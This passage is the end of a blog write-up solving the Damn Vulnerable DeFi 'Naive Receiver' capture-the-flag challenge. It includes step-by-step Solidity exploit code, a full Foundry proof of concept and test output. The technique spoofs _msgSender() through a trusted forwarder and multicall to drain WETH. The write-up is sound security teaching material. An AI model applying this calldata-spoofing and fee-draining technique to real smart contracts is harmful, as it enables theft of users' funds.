+<p>This allows an attacker to impresonate accounts and perform a withdraw on their behalf because the <code>_msgSender()</code> function is called on the <code>NaiveReceiverPool::withdraw()</code> method:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint256 amount, address payable receiver</span>) external &#123;</span><br><span class="line">        <span class="comment">// Reduce deposits</span></span><br><span class="line">        deposits[<span class="title function_">_msgSender</span>()] -= amount;</span><br><span class="line">        totalDeposits -= amount;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Transfer ETH to designated receiver</span></span><br><span class="line">        weth.<span class="title function_">transfer</span>(receiver, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>Our main goal in this challenge is to drain all WETH from the <code>FlashLoanReceiver</code>. We can do this by abusing the fact that the receiver blindly pays flash loan fees and that <code>_msgSender()</code> can be spoofed via the <code>trusted forwarder</code>.</p>
+<h2 id="Exploitation-Steps"><a href="#Exploitation-Steps" class="headerlink" title="Exploitation Steps"></a>Exploitation Steps</h2><p>The FlashLoanReceiver starts with 10 WETH. The pool charges a fixed fee of 1 WETH per flash loan, regardless of the loan amount.</p>
+<ol>
+<li>Prepare multiple flash loan calls:</li>
+</ol>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bytes[] memory data=<span class="keyword">new</span> bytes[](<span class="number">11</span>); <span class="comment">// 11 because the receiver has 10 weth as a start</span></span><br><span class="line"><span class="keyword">for</span> (uint256 i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">    data[i]=abi.<span class="title function_">encodeWithSelector</span>(pool.<span class="property">flashLoan</span>.<span class="property">selector</span>, receiver, address weth), <span class="number">0</span>, <span class="string">&quot;0x&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>Each flash loan costs 1 WETH fee, even if the amount is 0.</li>
+<li>By repeating this 10 times, the receiver will be forced to pay all 10 WETH it holds.</li>
+</ul>
+<ol start="2">
+<li>Append the withdraw call:</li>
+</ol>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="number">10</span>]=abi.<span class="title function_">encodePacked</span>(abi.<span class="title function_">encodeWithSelector</span>(pool.<span class="property">withdraw</span>.<span class="property">selector</span>, <span class="variable constant_">WETH_IN_POOL</span>+<span class="variable constant_">WETH_IN_RECEIVER</span>,<span class="title function_">payable</span>(recovery)),deployer);</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>The <code>_msgSender()</code> function in the pool reads the last 20 bytes of calldata (the deployer address).</li>
+<li>This will allow us to impersonate the deployer in order to withdraw all <code>WETH</code> from the pool and the receiver to our recovery address (malicious).</li>
+</ul>
+<ol start="3">
+<li>Encode the multicall using <code>Multicall::multicall()</code>:</li>
+</ol>
+<ul>
+<li>Using multicall, we forward all 11 calls in one transaction to make all the fees paid and to make the withdrawal request happen all at the same time.</li>
+</ul>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes memory multicall = abi.<span class="title function_">encodeCall</span>(pool.<span class="property">multicall</span>, data);</span><br></pre></td></tr></table></figure></div>
+
+<ol start="4">
+<li>Create a forwarded request</li>
+</ol>
+<ul>
+<li>We will prepare a meta-transaction using <code>BasicForwarder</code> where the <code>from</code> is the attacker address</li>
+</ul>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">BasicForwarder</span>.<span class="property">Request</span> memory req = <span class="title class_">BasicForwarder</span>.<span class="title class_">Request</span>(&#123;</span><br><span class="line">    <span class="attr">from</span>: player,</span><br><span class="line">    <span class="attr">target</span>: <span class="title function_">address</span>(pool),</span><br><span class="line">    <span class="attr">value</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">gas</span>: <span class="title function_">gasleft</span>(),</span><br><span class="line">    <span class="attr">nonce</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">data</span>: multicall,</span><br><span class="line">    <span class="attr">deadline</span>: <span class="number">1337</span> days <span class="comment">// 8)</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+
+<ol start="5">
+<li>Sign the request to make it legit else it will be rejected</li>
+</ol>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bytes32 requestHash=<span class="title function_">keccak256</span>(</span><br><span class="line">                abi.<span class="title function_">encodePacked</span>(</span><br><span class="line">                 <span class="string">&quot;\x19\x01&quot;</span>   ,</span><br><span class="line">                 forwarder.<span class="title function_">domainSeparator</span>(),</span><br><span class="line">                 forwarder.<span class="title function_">getDataHash</span>(req)</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">(uint8 v, bytes32 r, bytes32 s)=vm.<span class="title function_">sign</span>(playerPk,requestHash);</span><br><span class="line">bytes memory signature=abi.<span class="title function_">encodePacked</span>(r,s,v);</span><br></pre></td></tr></table></figure></div>
+
+<p>This is as explained previously for the <a class="link"   target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-712" >EIP-712 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> standard.</p>
+<ol start="6">
+<li>Now finally execute the request</li>
+</ol>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forwarder.<span class="title function_">execute</span>(req, signature);</span><br></pre></td></tr></table></figure></div>
+
+<p>The forwarder validates the signature and performs the multicall that will drain 1 WETH from the receiver 10 times. The final withdraw call moves all remaining WETH to our recovery address and BOOM exploited.</p>
+<h2 id="Exploit-test-case"><a href="#Exploit-test-case" class="headerlink" title="Exploit test case"></a>Exploit test case</h2><p>The full PoC is as follows:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test_naiveReceiver</span>(<span class="params"></span>) public checkSolvedByPlayer &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Attacker balance before:&quot;</span>, weth.<span class="title function_">balanceOf</span>(recovery)/<span class="number">1e18</span>);</span><br><span class="line">        bytes[] memory data=<span class="keyword">new</span> bytes[](<span class="number">11</span>); <span class="comment">// 11 because the receiver has 10 weth as a start</span></span><br><span class="line">        <span class="keyword">for</span> (uint256 i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="comment">//e prepare the flashloan function with a null amount and address (we just need to fill it no need for actual money transfer)</span></span><br><span class="line">            <span class="comment">// not interested in actual flash loan, we just want him to pay the fee</span></span><br><span class="line">            data[i]=abi.<span class="title function_">encodeWithSelector</span>(pool.<span class="property">flashLoan</span>.<span class="property">selector</span>, receiver, <span class="title function_">address</span>(weth), <span class="number">0</span>, <span class="string">&quot;0x&quot;</span>); </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//e withdraw accepts amount and receiver</span></span><br><span class="line">            <span class="comment">// &quot;receiver&quot; is the one that has the 1000 weth</span></span><br><span class="line">            <span class="comment">// deployer address is the last 20 bytes of data</span></span><br><span class="line">            data[<span class="number">10</span>]=abi.<span class="title function_">encodePacked</span>(abi.<span class="title function_">encodeWithSelector</span>(pool.<span class="property">withdraw</span>.<span class="property">selector</span>, <span class="variable constant_">WETH_IN_POOL</span>+<span class="variable constant_">WETH_IN_RECEIVER</span>,<span class="title function_">payable</span>(recovery)),deployer);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//e encode calldata with the multicall, which allows us to forward a lot of calls together to the pool</span></span><br><span class="line">            bytes memory multicall=abi.<span class="title function_">encodeCall</span>(pool.<span class="property">multicall</span>,data);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//e create forwarded request</span></span><br><span class="line">            <span class="title class_">BasicForwarder</span>.<span class="property">Request</span> memory req = <span class="title class_">BasicForwarder</span>.<span class="title class_">Request</span>(&#123;</span><br><span class="line">            <span class="attr">from</span>: player,</span><br><span class="line">            <span class="attr">target</span>: <span class="title function_">address</span>(pool),</span><br><span class="line">            <span class="attr">value</span>: <span class="number">0</span> ,</span><br><span class="line">            <span class="attr">gas</span>: <span class="title function_">gasleft</span>(),</span><br><span class="line">            <span class="attr">nonce</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">data</span>: multicall,</span><br><span class="line">            <span class="attr">deadline</span>: <span class="number">1337</span> days</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//e hash our request</span></span><br><span class="line">            bytes32 requestHash=<span class="title function_">keccak256</span>(</span><br><span class="line">                abi.<span class="title function_">encodePacked</span>(</span><br><span class="line">                 <span class="string">&quot;\x19\x01&quot;</span>   ,</span><br><span class="line">                 forwarder.<span class="title function_">domainSeparator</span>(),</span><br><span class="line">                 forwarder.<span class="title function_">getDataHash</span>(req)</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">//e sign our request else it will fail</span></span><br><span class="line">            (uint8 v, bytes32 r, bytes32 s)=vm.<span class="title function_">sign</span>(playerPk,requestHash);</span><br><span class="line">            bytes memory signature=abi.<span class="title function_">encodePacked</span>(r,s,v);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//e execute request</span></span><br><span class="line">            forwarder.<span class="title function_">execute</span>(req,signature);  </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Attacker balance after:&quot;</span>, weth.<span class="title function_">balanceOf</span>(recovery)/<span class="number">1e18</span>);      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>The output will be:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ forge test -vv</span><br><span class="line">[⠊] <span class="title class_">Compiling</span>...</span><br><span class="line">[⠒] <span class="title class_">Compiling</span> <span class="number">1</span> files <span class="keyword">with</span> <span class="title class_">Solc</span> <span class="number">0.8</span><span class="number">.25</span></span><br><span class="line">[⠑] <span class="title class_">Solc</span> <span class="number">0.8</span><span class="number">.25</span> finished <span class="keyword">in</span> <span class="number">557.</span>63ms</span><br><span class="line"><span class="title class_">Compiler</span> run successful!</span><br><span class="line"></span><br><span class="line"><span class="title class_">Ran</span> <span class="number">2</span> tests <span class="keyword">for</span> test/<span class="title class_">NaiveReceiver</span>.<span class="property">t</span>.<span class="property">sol</span>:<span class="title class_">NaiveReceiverChallenge</span></span><br><span class="line">[<span class="variable constant_">PASS</span>] <span class="title function_">test_assertInitialState</span>() (<span class="attr">gas</span>: <span class="number">38526</span>)</span><br><span class="line">[<span class="variable constant_">PASS</span>] <span class="title function_">test_naiveReceiver</span>() (<span class="attr">gas</span>: <span class="number">478330</span>)</span><br><span class="line"><span class="title class_">Logs</span>:</span><br><span class="line">  <span class="title class_">Attacker</span> balance <span class="attr">before</span>: <span class="number">0</span></span><br><span class="line">  <span class="title class_">Attacker</span> balance <span class="attr">after</span>: <span class="number">1010</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Suite</span> <span class="attr">result</span>: ok. <span class="number">2</span> passed; <span class="number">0</span> failed; <span class="number">0</span> skipped; finished <span class="keyword">in</span> <span class="number">6.</span>46ms (<span class="number">5.</span>33ms <span class="variable constant_">CPU</span> time)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Ran</span> <span class="number">1</span> test suite <span class="keyword">in</span> <span class="number">7.</span>63ms (<span class="number">6.</span>46ms <span class="variable constant_">CPU</span> time): <span class="number">2</span> tests passed, <span class="number">0</span> failed, <span class="number">0</span> skipped (<span class="number">2</span> total tests)</span><br></pre></td></tr></table></figure></div>
+
+<p>And that way, both our tests pass and the <code>checkSolvedByPlayer()</code> modifier that runs the <code>_isSolved()</code> function goes through. Marking the successful solve of the challenge.</p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>That was it for <code>Naive Receiver</code> challenge from <code>Damn Vulnerable DeFi</code> series.</p>
+<p>You can find through <a class="link"   target="_blank" rel="noopener" href="https://github.com/kujen5/Damn-Vulnerable-Defi-Solutions" >this github link the repository <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> that contains my solver  and all the future Damn Vulnerable DeFi solutions Inshallah!</p>
+<p>See you next time~</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Damn Vulnerable DeFi V4: Naive Receiver</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-12-18 16:54:33</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-12-18 17:16:45
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/12/18/Damn-Vulnerable-DeFi-V4-Naive-Receiver/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/12/15/Ethernaut-Hello-Ethernaut/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Ethernaut: Hello Ethernaut</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Damn Vulnerable DeFi V4: Naive Receiver</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E2%80%98Naive-Receiver%E2%80%99-challenge"><span class="nav-text">‘Naive Receiver’ challenge</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Challenge-Description"><span class="nav-text">Challenge Description</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Understanding-the-contracts"><span class="nav-text">Understanding the contracts</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview-1"><span class="nav-text">Overview</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NaiveReceiverPool-sol"><span class="nav-text">NaiveReceiverPool.sol</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FlashLoanReceiver-sol"><span class="nav-text">FlashLoanReceiver.sol</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BasicForwarder-sol"><span class="nav-text">BasicForwarder.sol</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Multicall-sol"><span class="nav-text">Multicall.sol</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Point-of-Failure"><span class="nav-text">Point of Failure</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation"><span class="nav-text">Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation-Steps"><span class="nav-text">Exploitation Steps</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-test-case"><span class="nav-text">Exploit test case</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-text">Conclusion</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
